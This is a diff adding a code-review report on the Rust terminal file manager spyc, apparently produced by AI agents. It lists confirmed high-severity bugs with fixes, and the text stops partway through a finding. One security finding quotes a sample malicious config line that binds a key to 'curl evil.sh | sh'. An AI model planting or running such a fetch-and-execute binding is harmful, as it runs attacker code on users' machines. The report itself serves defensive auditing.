@@ -1,0 +1,1057 @@
+# Deep code review — June 2026
+
+Full-codebase review of spyc at v1.57.0 (~55k LoC, 163 files), run as a
+multi-agent workflow: 40 finder agents (14 subsystem units x 4 lenses:
+correctness, maintainability, performance, security), cross-finder dedup,
+then adversarial verification (1 refuter per finding, 2 for high severity).
+The verification phase was cut short twice by the org spend limit; the 13
+high-severity findings it missed were hand-verified afterward (notes inline).
+
+**Stats:** 269 raw findings -> 228 after dedup -> 6 refuted, 104 confirmed (incl. hand-verified), 1 reclassified by-design, 117 unverified (verifier budget exhausted; treat as plausible-but-unchecked).
+
+Severity: high: 22, medium: 88, low: 112. Lens: correctness: 78, maintainability: 99, perf: 28, security: 17.
+
+## High severity
+
+### `src/app/key_dispatch/confirms.rs:46` — Synchronous tar+zstd archive of deleted trees runs inline in a key handler
+`high` · `maintainability` · `app-input` · **confirmed**
+
+handle_remove_confirm_key loops over the selected paths calling Graveyard::write_entry(p) followed by fs::ops::remove_tree(p), all inside the key-dispatch path. write_entry (src/state/graveyard.rs:145-175) creates a `<uuid>.tar.zst`, wraps it in a zstd encoder, and tars the entire tree with full metadata — for a delete of e.g. a `target/` or `node_modules/` directory this is seconds-to-minutes of blocking CPU+disk IO on the single event loop thread: no redraw, no input, no flash, the app just freezes after the user hits `y`. The same class repeats in this file: undo_last_remove (line 95, Graveyard::restore un-tars inline) and handle_graveyard_purge_all_confirm (lines 127-132, cascade_entry_to_trash for every entry, plus a full `self.state.graveyard.clone()` just to satisfy the borrow checker). This violates the contract's "effects are data; run_effects is the only executor" rule and is exactly the "blocking IO on the input path" scaling pitfall the project has committed to moving off-thread (capture/grep/finder/git already all stream from workers).
+
+**Fix:** Emit an Effect (e.g. Effect::GraveyardArchive { paths }) and run the archive+unlink on a worker thread like the existing capture/finder/git-worker pattern, reporting completion via the message channel (flash + refresh_listing on the result Message). Same treatment for restore and purge-all.
+
+> verifier: confirmed: Verified directly in the code. (1) The claimed behavior is real: src/app/key_dispatch/confirms.rs:45-63 loops over selected paths calling Graveyard::write_entry then fs::ops::remove_tree inline and returns Vec::new() (no Effect). write_entry (src/state/graveyard.rs:129-220) synchronously creates <uuid>.tar.zst via a zstd encoder + tar::Builder::append_dir_all with full metadata, then does a second full recursive walk (walk_size) to count files/bytes — unbounded CPU+disk IO proportional to the deleted tree. (2) It is reachable and unguarded: the handler runs inside App::update on the …
+
+### `src/app/pager_handler/motion.rs:311` — `v` (edit in $EDITOR) from a bottom scrollback pager closes/restores the wrong pager slot, leaving an orphaned pager that Esc/q cannot close
+`high` · `correctness` · `app-pager` · **confirmed**
+
+When the active pager is the bottom scrollback (`view.scroll_pager`, pane focused — route.rs:184 routes its keys to `handle_pager_key`, and `active_pager_mut!` resolves to the scroll slot), the `v` arm takes the temp-file path (scrollback views never have `source_path`; see pane_scroll.rs:243 and pager_stream.rs:188), stores `PagerReturn::TempFile { mount: LowerPane, pane_scroll: true }`, then calls `self.clear_pager()` (motion.rs:311). `clear_pager` only clears the TOP slot `self.view.pager` — so (a) a coexisting `D` top pager (coexistence is explicitly supported, see pager_handler/mod.rs:180-187) is silently destroyed, and (b) the scrollback being edited stays open in `scroll_pager`. After $EDITOR exits, the restore path (effect.rs:492-540) calls `self.set_pager(view)`, which installs the round-tripped `pane_scroll=true` view into the TOP slot — now two pagers exist: the stale original in `scroll_pager` and the edited copy in `view.pager`. Worse, once the user closes the scrollback, Esc/q on the orphaned top pager hits the `pane_scroll` early branch (motion.rs:28-31) → `close_pane_scroll_pager()` which early-returns because `scroll_pager` is None (pager_handler/mod.rs:155-157) — so Esc and q become no-ops and the pager is stuck (only `[b` with non-empty history escapes). The flow itself is intentional (the comment at motion.rs:242-247 says `v` from the lower-pane scrollback is a supported, previously-regressed path); it broke when the scrollback moved from `view.pager` into the dedicated `scroll_pager` slot (PR #309-#311) without updating this close/restore pair.
+
+**Fix:** In the `v` arm, when the active pager is the scroll pager, tear down that slot (`close_pane_scroll_pager()`/`exit_scroll_mode`) instead of `clear_pager()`; and in the `PagerReturn` restore (effect.rs), route `pane_scroll == true` views back into `view.scroll_pager` (re-entering the pane's scroll mode) rather than `set_pager`. Also make the Esc/q `pane_scroll` branch fall through to a normal close when `scroll_pager` is None so an orphaned pane_scroll view can always be dismissed.
+
+> verifier: confirmed: CONFIRMED. I traced every link of the claimed chain in the actual code and could not refute it.
+
+(1) Reachability: `^a v` mounts the scrollback into the dedicated slot `view.scroll_pager` with `pane_scroll=true`, `mount=LowerPane`, and — verified by grep — NO `source_path` ever set (src/app/pane_scroll.rs:239-259 `mount_scroll_pager`; the streaming transcript path in src/app/pager_stream.rs LowerPane branch likewise sets `pane_scroll=true`, no source_path). With the pane focused, route.rs:184 sends non-meta keys (including plain `v`) to `InputSink::PagerKey`, and `active_pager_mut!` …
+
+### `src/app/proc.rs:234` — Failed $EDITOR/$SHELL spawn aborts the whole spyc session (and kills all pane children)
+`high` · `correctness` · `app-proc` · **confirmed**
+
+`run_child_in_foreground` does `let mut child = cmd.spawn()?;` after `suspend_tui`. The program here is exec'd directly, not via `sh -c`: `ActivateIntent::Edit` (navigate.rs:247) and the touch-and-edit prompt (prompt.rs:571) pass `shell::resolve_editor()` ($VISUAL/$EDITOR split on whitespace, default `vi`), and `Action::StartShell` (state/apply.rs:164) passes `$SHELL`. If the binary is missing or misspelled (e.g. `EDITOR=nvim` on a box without nvim), spawn fails with ENOENT and the Err propagates: ForegroundExec::run returns it, `fg.run(...)?` at effect.rs:483 propagates out of `run_effects`, through `dispatch_effective` (run.rs:219), and out of `App::run` — spyc exits. All pane PtyHosts are dropped (SIGKILL on claude/codex children) and the session is NOT saved (save_session only runs in request_quit). Pressing `e` on a file with a bad $EDITOR therefore destroys every in-flight agent conversation. The error path also skips `resume_tui` (only outer teardown restores the terminal).
+
+**Fix:** Handle the spawn error inside `run_child_in_foreground`: on `Err`, call `resume_tui(terminal)` and return the error as a value the caller turns into `state.flash_error("spawn {program}: {e}")` instead of `?`-propagating; or catch the Err in the `Effect::ForegroundExec` arm of run_effects and flash it (mirroring the CopyToClipboard arm's never-abort rule).
+
+> verifier: confirmed: Verified each link of the claimed failure chain in the actual code; the defect exists as stated.
+
+1. Spawn failure propagates: src/app/proc.rs:234 is `let mut child = cmd.spawn()?;` inside `run_child_in_foreground`, after `suspend_tui(terminal)?` at line 220. On Err, `resume_tui` (line 276) is skipped — the function returns early.
+
+2. The program is exec'd directly, not via sh -c, for exactly the claimed paths: `Command::new(program)` (proc.rs:222). `ActivateIntent::Edit` (src/app/navigate.rs:240-252) and the prompt path (src/app/prompt.rs:564) pass `shell::resolve_editor()` — $VISU …
+
+### `src/app/render/chrome.rs:125` — Pane-divider cwd truncation byte-slices a String — panics on non-ASCII cwd
+`high` · `correctness` · `app-render` · **confirmed**
+
+render_pane_status_line truncates the active tab's live cwd with `format!("…{}", &cwd_display[cwd_display.len() - avail + 1..])` (chrome.rs:124-126). `cwd_display` comes from `display_tilde(&live)` and contains whatever bytes the directory path has; `cwd_display.len()` and `avail` are byte counts. If the path contains any multi-byte character (accented letters, CJK, Cyrillic — e.g. a project dir named "résumé" or "日本語"), the slice start `len - avail + 1` can land in the middle of a UTF-8 code point, and `&str[start..]` panics ("byte index N is not a char boundary") in the middle of the render pass — the app crashes. Reachable whenever the pane divider is drawn and the cwd is longer than the available width (narrow terminal, several tabs, or just a deep path), which is exactly when truncation triggers. Even for paths that happen to slice on a boundary, mixing bytes with display columns over-truncates non-ASCII paths.
+
+**Fix:** Truncate on char/grapheme boundaries by display width: walk `cwd_display.chars().rev()` accumulating `unicode_width` until the budget is reached, then take that suffix (or use a shared tail-truncate helper next to `crate::ui::display_width`). Add a unit test with a multi-byte cwd at a width that forces truncation.
+
+> verifier: confirmed: The defect exists exactly as claimed. /Users/derekmarshall/src/spyc/src/app/render/chrome.rs:124-126 contains `format!("…{}", &cwd_display[cwd_display.len() - avail + 1..])` inside `render_pane_status_line` (chrome.rs:17), which is called from three places in the live render path (src/app/render/inner.rs:87, 139, 217).
+
+Data flow allows arbitrary non-ASCII: `cwd_display` comes from `crate::paths::display_tilde(&live)` (paths.rs:39), which returns the path via `to_string_lossy()` essentially verbatim (only collapsing a `$HOME` prefix to `~`), and `live` is `entry.live_cwd()` (src/pan …
+
+### `src/app/render/inner.rs:30` — Top-overlay area anchored at layout.status.y panics with status_position = "bottom"
+`high` · `correctness` · `app-render` · **confirmed**
+
+render_inner builds the `;cmd`/`$EDITOR` overlay rect as `Rect { y: layout.status.y, height: status.height + list.height + prompt.height }` (inner.rs:28-35; same construction for the `D` TopPane pager at lines 121-126). This is only correct when the status bar is the TOP row of the spyc unit. With the supported config `status_position = "bottom"` (`StatusPosition::Bottom`, exercised by the `snapshot_frame_status_bottom` test), compute_layout puts `status.y` on the LAST row (render/mod.rs:54-58 and 130-135), so the overlay rect becomes e.g. y = h-1 with height = h — extending far past the buffer. The overlay is drawn by `PaneWidget` (src/pane/widget.rs), which does NOT intersect its area with the buffer: it calls `buf.set_string(x, area.y + row, ...)` for every screen row, and ratatui 0.30's `Buffer::set_stringn` indexes `self[(x, y)]` → `index_of` → `panic!("index outside of buffer")` (verified in ratatui-core-0.1.1/src/buffer/buffer.rs:249-256). Concrete failure: a user with `status_position = "bottom"` opens `$EDITOR` or any `;cmd` overlay → spyc panics on the first frame, killing the TUI (and any child agents' visible session). The TopPane `D`-pager branch hits the same wrong-origin rect; `pager::render` uses clipping widgets so it doesn't panic, but the pager paints only its top line on the bottom row while the rest of the screen shows stale list content — the document is unreadable.
+
+**Fix:** Compute the top-unit rect from the actual minimum y of the three regions, e.g. `let top_y = layout.status.y.min(layout.list.y).min(layout.prompt.y); Rect { x, y: top_y, height: status.height + list.height + prompt.height, .. }` — or better, add a `top_unit: Rect` field to FrameLayout filled in by compute_layout for each branch, and use it in both the overlay and TopPane-pager branches (and the matching `prepare_panes` resize). Add a snapshot/regression test: bottom status + top_overlay open.
+
+> verifier: confirmed: Verified every link of the claimed failure chain against the code; could not refute it. (1) inner.rs:30-35 builds the ;cmd/$EDITOR overlay rect as {y: layout.status.y, height: status+list+prompt heights}, and the D TopPane pager branch (lines 121-126) is identical. (2) compute_layout (render/mod.rs:54-58 paneless, 130-135 with-pane) puts status.y on the LAST row when status_position = "bottom", so the rect becomes e.g. y=23,height=24 on an 80x24 frame — extending past the buffer. (3) No clipping anywhere: ratatui-core-0.1.1 Frame::render_widget passes the area through unchanged (fra …
+
+### `src/app/route.rs:199` — Open prompt is shadowed by PaneExitedFlash/PaneScroll/scroll-pager arms — crash-recovery [Y/n] prompt is unanswerable
+`high` · `correctness` · `app-loop` · **confirmed**
+
+route_input checks is_prompting only in arm 5 (BottomPane, line 206) and arm 6 (Prompt, line 212). Arms 2b (line 184, scroll pager), 3 (line 191, PaneScroll) and 4 (line 199, PaneExitedFlash) fire before the Prompt arm with no is_prompting guard. Concrete failure: a session saved with pane_focused=true is restored (session.rs:310 sets Focus::Pane); the restored claude tab crashes (exits nonzero), so the pre-recv drain marks it closed and loop_steps.rs:235 opens the ClaudeCrashRecover prompt ('claude crash detected — start fresh and recover with /resume? [Y/n]'). Every subsequent non-meta key — y, n, Enter, Esc — hits arm 4 (has_pane_tabs && pane_focused && pane_closed && !is_meta) and routes to InputSink::PaneExitedFlash, which flashes 'pane exited — ^a-R to restart' and discards the key. The recovery prompt the feature exists for can never be answered; the user must guess that a ^W k focus chord unblocks it. Same hole: opening a prompt via a ^a chord while the pane is in scrollback mode (arm 3) or while a ^a v scroll pager is open (arm 2b) sends the typed prompt text to the scroll handler/pager instead of the prompt. Nothing resets focus when a pane child exits (only close_active_tab does), so the state combination is stable. The existing test prompt_wins_over_focused_pane only covers the pane_closed=false, pane_scrolling=false case.
+
+**Fix:** Hoist the is_prompting check above the pane-owned content arms (or add !snap.is_prompting to arms 2b, 3, and 4) so an open prompt always wins over pane-derived sinks, matching the documented 'prompts win over panes' invariant. Add regression tests: RouteSnapshot { is_prompting: true, focus: Pane, pane_closed: true, .. } must route to InputSink::Prompt, and likewise for pane_scrolling and has_scroll_pager.
+
+> verifier: confirmed: Verified each link of the claimed chain in the actual code. (1) route_input in src/app/route.rs checks is_prompting only in arm 5 (line 206, as an exclusion) and arm 6 (line 212); arms 2b/3/4 (lines 184/191/199) precede the Prompt arm with no is_prompting guard, so with focus=Pane + has_pane_tabs + pane_closed, every non-meta key returns InputSink::PaneExitedFlash. (2) key_dispatch/mod.rs has no prompt intercept before route_input; the PaneExitedFlash arm flashes a hint and discards the key. (3) y/n/Enter/Esc are all non-meta per is_spyc_meta_when_pane_focused (mod.rs:953 — only F10 …
+
+### `src/app/state/apply.rs:113` — AppState::apply performs inline filesystem IO (file copies, tar+zstd archiving) through the state-module mutators, violating the pure-Model contract
+`high` · `maintainability` · `state-sessions` · **confirmed**
+
+CLAUDE.md says the pure transitions (AppState::apply) have "no terminal/OS access" and that handlers "never touch the OS directly" — effects are data executed only by run_effects. But Action::Untake in apply.rs:113 calls self.inventory.remove_by_id, which (src/state/inventory.rs:212-239 move_to_graveyard) synchronously builds a zstd-compressed tarball of the cached file via Graveyard::write_entry_as and unlinks the inventory pair. Likewise Action::Take → AppState::take → inventory.yank_many (src/app/state/selection.rs:77 → src/state/inventory.rs:104 fs::copy of the full file), Action::EmptyInventory → inventory.clear (apply.rs:129, archives every item), set_mark → marks.save() (src/app/state/selection.rs:32), and frecency.record → save() to disk on every chdir (src/app/state/listing.rs:228 → src/state/frecency.rs:59). All of this is blocking disk IO — including zstd compression of arbitrarily large yanked files — executed inside the Model on the input/render thread, exactly the "inline-IO bug class" the Effect seam exists to prevent, and the kind of blocking-IO-on-the-input-path scaling pitfall the project has already been bitten by.
+
+**Fix:** Split the state-module mutators into a pure in-memory half (Model) and a persistence half returned as Effect variants (e.g. Effect::PersistMarks, Effect::InventoryYank(paths), Effect::InventoryToGraveyard(id)) executed by run_effects — with the heavyweight tar/zstd archive work pushed to a worker thread that reports back via the message channel, matching the agent-status/PagerStream off-thread pattern.
+
+> verifier: same family as confirmed apply.rs:281 (inline fs IO in the pure Model)
+
+### `src/app/state/apply.rs:281` — Unbounded recursive disk walk inside the pure AppState::apply (RemovePrompt)
+`high` · `maintainability` · `app-mvu-state` · **confirmed**
+
+The `Action::RemovePrompt` arm of `AppState::apply` calls `std::fs::symlink_metadata` per selected path and `count_files_in_dir` (src/app/state/mod.rs:607 — unbounded recursive `read_dir` walk) synchronously on the key-input path, before the confirm prompt even appears. This violates the CLAUDE.md contract for the pure transitions ("no terminal/OS access, unit-testable without a TUI") — a contract the codebase itself enforces elsewhere: the dispatch_prompt comment at dispatch.rs:367-370 explicitly keeps Jump/MakeDir/Worktree out of the pure producer because they "do unbounded blocking IO". Pressing `R`/`dd` on a directory like `node_modules`, `target/`, or any large tree freezes the event loop for the full walk (the inline comment's "sub-second on any sane subtree" assumption does not hold on the ~110k-file repos this codebase elsewhere optimizes for, e.g. the GitCache docs at mod.rs:284-285).
+
+**Fix:** Move the blast-radius count out of `apply`: emit an Effect (or push a Message) that performs the walk in the executor/off-thread and then updates the prompt text — e.g. show the prompt immediately with "counting…" and patch in the file count when the walk completes. If the walk is kept, use the `walkdir`/`jwalk` crate (per the repo's crate-over-handroll preference) with a cap, mirroring `count_subdirs_capped`.
+
+> verifier: confirmed: The defect exists exactly as claimed, and every citation in the finding checks out.
+
+1. The code does what the finding says. /Users/derekmarshall/src/spyc/src/app/state/apply.rs:277-285 — the `Action::RemovePrompt` arm of the pure `AppState::apply` loops over selected paths calling `std::fs::symlink_metadata` and, for each directory, `count_files_in_dir(p)` (line 281), all before setting the RemoveConfirm prompt. `count_files_in_dir` (/Users/derekmarshall/src/spyc/src/app/state/mod.rs:607-623) is a fully recursive `read_dir` walk with a `symlink_metadata` per entry, no cap, no depth …
+
+### `src/app/streaming.rs:170` — Foreground `!` capture re-parses its entire unbounded buffer on every output tick (O(n^2) ANSI parse on the main thread)
+`high` · `perf` · `app-loop` · **confirmed**
+
+`drain_pending_capture` (called from the pre-recv scan every loop iteration, src/app/run.rs:442) appends new chunks to `capture.buffer`, then under `if got_data || capture.finished` (src/app/streaming.rs:167-171) runs `strip_crlf(&capture.buffer)` (full copy) and `normalized.as_slice().into_text()` (full ansi_to_tui re-parse) over the ENTIRE accumulated buffer, replacing `view.lines` wholesale. The capture host's reader fires a `SinkOutput` wake per PTY read, so a `!cargo build` / `!make test` streaming output triggers this once per ~chunk: for a 50 MB log delivered in ~1000 chunks that is ~25 GB of cumulative copy+parse on the render/input thread — visible multi-hundred-ms stalls per tick that worsen as the buffer grows. Unlike background tasks, which are capped (`TASK_BUFFER_CAP = 1_048_576`, src/app/tasks.rs:72, enforced in drain_background_tasks src/app/streaming.rs:231-234), `PendingCapture.buffer` (src/app/capture.rs:29) has no cap at all, so memory growth is also unbounded.
+
+**Fix:** Cap `capture.buffer` the same way tasks are capped (drain the front past a cap), and make the pager rebuild incremental: keep the parsed `Text` and only strip/parse the newly appended chunk (carrying the partial last line across ticks), or at minimum re-parse only the trailing window that can be visible plus the cap'd tail.
+
+> verifier: confirmed: The claim holds as stated. (1) drain_pending_capture is called every main-loop iteration from the pre-recv scan (src/app/run.rs:442, render/input thread). (2) streaming.rs:135-138 appends chunks to capture.buffer; lines 167-190, gated only on `got_data || capture.finished`, run strip_crlf over the ENTIRE buffer (util.rs:113 — itself 1-2 full copies) plus a full ansi_to_tui into_text() re-parse, replacing view.lines wholesale — no incrementality. (3) PendingCapture.buffer (src/app/capture.rs:29) has no cap anywhere in the tree; the only buffer cap is TASK_BUFFER_CAP (tasks.rs:72), en …
+
+### `src/config/mod.rs:322` — Untrusted project-local .spycrc.toml can bind any key to arbitrary shell commands
+`high` · `security` · `platform` · **confirmed**
+
+Config::load_default unconditionally loads `<cwd>/.spycrc.toml` (src/config/mod.rs:322), and the keymap DSL's `unix` action (src/config/dsl.rs:166-171) carries a verbatim shell command that executes via `sh_c(&cmd, true)` when the bound key is pressed (src/app/key_dispatch/mod.rs:501-504) — no prompt, no confirmation. The reload path is worse: `App::reload_config` (src/app/config.rs:17) loads from `self.state.listing.dir`, i.e. whatever directory the user has *browsed to*, and ^R is bound to ReloadConfig. Under this codebase's stated threat model (hostile content: extracted tarballs, cloned repos inspected with a file manager), an attacker ships a `.spycrc.toml` containing e.g. `map j unix curl evil.sh | sh` — the victim launches spyc in (or browses into and hits ^R) the hostile directory and the very first `j` keypress silently executes the attacker's command. This is the vim-modeline / local-rc code-execution class that direnv, nvim (exrc), and others gate behind explicit trust.
+
+**Fix:** Gate project-local configs behind a trust prompt (direnv-style allow list keyed on path+hash), or restrict project-level files to non-executing settings: accept `[colors]`/`[layout]`/etc. from `<cwd>/.spycrc.toml` but only honor `keymap` entries carrying `unix`/`jump`/`copy`/`move` payloads from `$HOME/.spycrc.toml`. At minimum, stop `reload_config` from reading the browsed directory (`listing.dir`) and pin it to the startup cwd.
+
+> verifier: hand-verified: <cwd>/.spycrc.toml auto-loaded with project-wins precedence; DSL `unix <cmd>` binds keys to shell commands
+
+### `src/fs/ops.rs:101` — copy_tree recurses without bound when the destination is inside the source tree
+`high` · `correctness` · `fs` · **confirmed**
+
+copy_tree(src, dst) does fs::create_dir_all(dst) and then iterates fs::read_dir(src), recursing into every child. If dst lies under src (user picks /proj, navigates into /proj/backup, pastes — dispatch_selection produces copy_tree(/proj, /proj/backup/proj)), the create_dir_all plants new directories inside the tree being read, and the recursion re-discovers them: /proj/backup/proj/backup/proj/... It keeps descending and re-copying sibling files at every level until the absolute path exceeds PATH_MAX and a syscall fails with ENAMETOOLONG. By then it has created hundreds of nested directories and duplicated file payloads many times over (multi-GB garbage for a large source dir), then surfaces only a cryptic 'File name too long' flash, leaving the user a deep tree to clean up. cp(1) rejects this case with 'cannot copy a directory into itself'. The move_tree EXDEV fallback (line 123) hits the same code path.
+
+**Fix:** Before recursing, reject the operation when dst.starts_with(src) on canonicalized paths (and the dst==src case), returning InvalidInput like cp does.
+
+> verifier: hand-verified: copy_tree has no dst-inside-src guard
+
+### `src/fs/ops.rs:149` — No same-file / dir-into-itself guard: copying a file onto itself truncates it to zero bytes
+`high` · `security` · `fs` · **confirmed**
+
+dispatch_selection (ops.rs:149-180) and copy_tree (ops.rs:85-113) never compare src and dst. Two concrete failure modes, both guarded against by real cp(1) and both reachable from the UI copy-to prompt (src/app/prompt.rs:512 and src/app/key_dispatch/mod.rs:519 -> run_selection_to in src/app/clipboard.rs:227, which calls op(&paths, &dest) synchronously with no path checks): (1) Pick a file in the current dir and give '.' (or the dir itself) as the dest: dest is an existing dir, so dispatch_selection calls copy_tree(src, dest.join(name)) where dest.join(name) is the same inode as src. std::fs::copy opens the destination with create+truncate before reading, so the file is truncated to 0 and then 'copied' from the now-empty fd — silent data loss on both Linux and macOS. (2) Copy a directory into its own subtree (dest = a/backup with src = a): copy_tree creates a/backup, then read_dir(a) enumerates the just-created 'backup' entry (it exists before opendir), recursing into a/backup/backup/... — each level re-copies the directory contents — until ENAMETOOLONG stops it. This duplicates the tree contents once per nesting level (hundreds of levels before PATH_MAX), can fill the disk for a large source dir, and blocks the event loop the whole time since run_selection_to is synchronous.
+
+**Fix:** In dispatch_selection, before dispatching: resolve each source and the effective destination (canonicalize the existing parts), and return InvalidInput if the destination equals a source ('X and Y are the same file') or if the destination path starts_with a source directory ('cannot copy a directory into itself'). A dev/ino comparison via fs::metadata catches the same-file case robustly across symlinks.
+
+> verifier: hand-verified: same cluster as ops.rs:167
+
+### `src/fs/ops.rs:167` — Copying a selection into its own directory truncates the source file to 0 bytes and reports success
+`high` · `correctness` · `fs` · **confirmed**
+
+dispatch_selection has no same-path guard: if dest is an existing directory it calls one(src, &dest.join(name)). When the user picks a file in /dir and gives /dir (or '.', resolved via listing.dir.join in clipboard.rs run_selection_to, which also has no guard) as the copy destination, dst == src and copy_tree falls through to fs::copy(src, src) at line 111. std::fs::copy opens the destination with O_TRUNC before copying (both Linux kernel_copy and macOS fcopyfile paths), so the shared inode is truncated to zero and the subsequent copy reads 0 bytes from the now-empty file. The operation returns Ok, run_and_flash shows 'copied 1 item(s)...', and the user's file content is silently destroyed. GNU cp guards exactly this ('X and X are the same file'); spyc does not. Move is safe (rename to self is a POSIX no-op), copy is not.
+
+**Fix:** In dispatch_selection (or copy_tree), error out when the resolved destination equals the source (compare canonicalized paths, or same dev+ino via fs::metadata) before invoking the per-item op, mirroring cp's 'same file' error.
+
+> verifier: hand-verified: dispatch_selection has no same-file guard; fs::copy(src,src) truncates
+
+### `src/git/worktree.rs:188` — worktree::add performs a full-tree checkout synchronously on the main input thread
+`high` · `perf` · `git` · **confirmed**
+
+`add()` materializes the entire branch tree into the new worktree via `gix::worktree::state::checkout` (worktree.rs:188-197), preceded by `list(dir)` (worktree.rs:146) which gix-opens the main repo plus every linked worktree. Its only production caller is the prompt handler `PromptKind::WorktreeNewBranch` at src/app/prompt.rs:620, which runs inside the App update/dispatch on the main event-loop thread. On the ~110k-file monorepo this codebase repeatedly cites (state/git.rs comments measure a mere index walk at 200-500 ms), writing every file of the tree to disk blocks input and rendering for many seconds to minutes — no redraw, no keypress handling, indistinguishable from a hang. This is exactly the blocking-IO-on-the-input-path class the git status worker was built to eliminate, and it contradicts the CLAUDE.md 'effects are data; run_effects is the only executor' rule (the handler reaches the OS directly).
+
+**Fix:** Make worktree creation an `Effect` executed on a background task (the BackgroundTasks/git-worker pattern already exists): the prompt handler returns the effect, the worker runs `worktree::add` and posts a Message with the Result; the chdir + PROJECT_HOME re-anchor happen when the completion message arrives. Flash a 'creating worktree…' notice meanwhile.
+
+> verifier: hand-verified by nature: full-tree checkout runs synchronously in the key-handler path
+
+### `src/git/worktree.rs:310` — W d deletes uncommitted work when the dirty check can't run (fails open)
+`high` · `correctness` · `git` · **by-design**
+
+remove() treats repo_status(path) == None as removable (the `_ => {}` arm falls through to remove_dir_all). But repo_status returns None for ANY status-walk error, not just "not a repo" — verified experimentally: a single permission-denied directory inside the worktree (root-owned docker dir, 000-mode cache dir, etc.) makes repo_status return None. Reproduced end-to-end: created a worktree via add(), wrote 21 uncommitted files, added one 000-mode directory, called remove() — the dirty guard was bypassed and remove_dir_all deleted 16 of the 21 uncommitted files before incidentally hitting the unreadable dir and erroring with PermissionDenied. The user gets an opaque 'Permission denied' instead of the dirty-refusal, and most of their uncommitted work is gone. Any None cause that doesn't itself block deletion destroys the whole worktree silently.
+
+**Fix:** Fail closed: in remove(), treat repo_status(path) == None as a refusal ("could not verify the worktree is clean; not removing") rather than falling through. If the 'don't strand the user' escape hatch is wanted, gate it behind an explicit force flag in the W d flow. Additionally make repo_status resilient per finding on status.rs:246 so a clean-but-partially-unreadable worktree can still be verified.
+
+> verifier: hand-verified: the fail-open on status failure is explicit and commented (avoid stranding un-removable worktrees) — a deliberate, debatable call, not an oversight
+
+### `src/mcp/mod.rs:42` — Full MCP traffic, including file contents, logged to fixed world-readable /tmp/spyc-mcp.log
+`high` · `security` · `mcp-agent` · **confirmed-partial**
+
+mcp_log() appends to the hardcoded path /tmp/spyc-mcp.log with OpenOptions::create(true).append(true) — no mode restriction, no O_NOFOLLOW. With a default umask the file is created 0644 (world-readable) in world-writable /tmp. run_proxy logs every request body (src/mcp/server.rs:222-226, "proxy: stdin → socket ...: {msg}") and every response body (src/mcp/server.rs:262-266, "proxy: socket → stdout ...: {response}") — the response to get_file_content is the full text of the file read, so any file the agent reads via MCP is mirrored into a world-readable /tmp file. This directly defeats the shared-machine hardening the code itself commits to at src/mcp/server.rs:296-298, where the socket is deliberately bound owner-only "so other users on a shared machine cannot connect and read files". Additionally, because the path is fixed in /tmp, another local user can pre-create the file (capturing the victim's traffic in a file the attacker owns) or plant a symlink, causing spyc to follow it and append log lines to an attacker-chosen file owned by the victim.
+
+**Fix:** Move the log to the owner-only state dir (~/.local/state/spyc/mcp.log), open it with mode 0600 (OpenOptionsExt::mode) and O_NOFOLLOW, and stop logging full message/response bodies in the proxy — log method names, ids, and byte counts only (or gate body logging behind an explicit SPYC_MCP_DEBUG env var).
+
+> verifier: hand-verified: fixed predictable /tmp/spyc-mcp.log (umask-world-readable, symlink-attackable). Whether payloads (vs sizes) are logged varies by call site
+
+### `src/pane/mod.rs:430` — recent_lines/save_to_file read one stale viewport, not the recent tail — vt100 contents() is viewport-only
+`high` · `perf` · `pane-pty` · **confirmed**
+
+`recent_lines` (mod.rs:430-445) and `save_to_file` (mod.rs:498-515) do `set_scrollback(10_000)` then `s.contents()` expecting "scrollback + visible screen". In vt100 0.16.2, `Screen::contents()` -> `Grid::write_contents()` iterates only `visible_rows()` — exactly `rows_len` (pane-height) rows at the current scrollback offset (vt100-0.16.2/src/grid.rs:126-144, 201-215; verified in the registry source). `set_scrollback(10_000)` clamps to scrollback_len and jumps to the TOP of history, so once any scrollback exists these functions return at most ~24-50 lines from the OLDEST end — not the last `max_lines`. Callers that scale with long-running panes get the wrong region: gf/gF path picking via `PaneTextKind::Scrollback(200)`/`Pickable` (src/app/effect.rs:340-341), agent crash-marker scan `recent_lines(200)` (src/app/pane_tabs.rs:209, src/agent/mod.rs:229/330, src/agent/resume.rs:214), and the just-landed resume-verify tail scan (src/app/pane_tabs.rs:161, branch fix/resume-enter-verify) — if Claude's banner scrolls the main screen before alt-screen entry, the verify reads the oldest banner lines, never sees the typed `/resume <sid>`, and silently skips the retry the feature exists for. `save_to_file` ("Save full scrollback + screen") writes a single oldest-viewport page instead of the session history. It works only while scrollback_len == 0 (fresh pane / alt-screen), which is why it survives casual testing. The sibling module src/ui/scrollback.rs:14-28 explicitly documents that vt100's API is viewport-only and page-walks offsets to compensate — these two functions predate that knowledge.
+
+**Fix:** Reuse the page-walk mechanic from `ui::scrollback::lines_from_scrollback`: for `recent_lines(n)`, walk only the last ceil(n/rows) offsets (newest pages first) and stop once n lines are collected — bounded work regardless of a 10k-line buffer; for `save_to_file`, walk the full history. Add a unit test that fills >rows lines into a parser and asserts the tail (not head) comes back.
+
+> verifier: hand-verified: vt100 0.16 visible_rows() yields one screen-height window at the scrollback offset; set_scrollback(max)+contents() returns the OLDEST viewport
+
+### `src/pane/pty_host.rs:352` — reap_exit can block the main thread indefinitely: EOF on the pty master does not imply the direct child exited
+`high` · `security` · `pane-pty` · **confirmed-edge**
+
+reap_exit's contract comment says "the reader saw EOF on the pty master, which means every fd to the slave is closed, so the direct child has already exited and this returns immediately". That inference is wrong: a child that closes or redirects all of its slave fds while continuing to run (e.g. a capture/task command like `exec myserver </dev/null >log 2>&1`, or a shell that exec-optimizes `-c 'cmd </dev/null >log 2>&1'`, or any server that detaches its stdio in place) makes the reader see EOF while the child is still alive. drain() then reports newly_closed, try_wait() returns Ok(None) (still running), and the fallback `self.child.wait()` (line 356) blocks. Both callers — drain_streaming_capture (src/app/streaming.rs:197) and drain_background_tasks (src/app/streaming.rs:249) — run on the main event loop, so the entire UI freezes for the child's remaining lifetime. Because spyc installs a no-op SIGINT handler (src/main.rs:319), the user cannot ^C out; only kill -9 recovers. This violates the documented "bounded synchronous reap" exception to the no-blocking-IO rule.
+
+**Fix:** Don't fall back to an unconditional wait(). When try_wait() returns None after EOF, either (a) keep the capture/task in a 'closing' state and retry try_wait on subsequent ticks (with a SIGKILL escalation after a deadline), or (b) move the wait onto a short-lived thread that posts the ExitOutcome back through the message channel. At minimum bound the wait with a try_wait poll loop + deadline like shutdown() does.
+
+> verifier: hand-verified: wait() fallback can block if the child closes its slave fds without exiting (EOF != exited); rare but unguarded
+
+### `src/state/health.rs:24` — Startup health check deletes every valid graveyard entry's metadata (schema mismatch: expects .json+.dat, graveyard is .json+.tar.zst)
+`high` · `maintainability` · `state-sessions` · **confirmed**
+
